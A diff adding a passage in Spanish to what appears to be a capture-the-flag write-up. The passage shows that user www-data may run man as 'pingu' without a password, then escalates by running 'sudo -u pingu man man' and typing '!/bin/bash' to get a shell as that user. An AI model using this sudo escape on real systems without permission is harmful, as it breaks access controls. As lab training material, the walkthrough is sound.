@@ -95,6 +95,21 @@ User www-data may run the following commands on debddace088e:
     (pingu) NOPASSWD: /usr/bin/man
 ```
 
+Por lo tanto si ejecutamos la siguiente comando podemos hacerlo como el usuario pingu
+
+```ruby
+sudo -u pingu man man
+```
+Dentro del manual podemos ejecutar la siguiente 
+```ruby
+!/bin/bash
+```
+Vemos que nos mudamos de usuario y accedemos como pingu 
+
+![alt text](image.png)
+
+
+
 
 
 
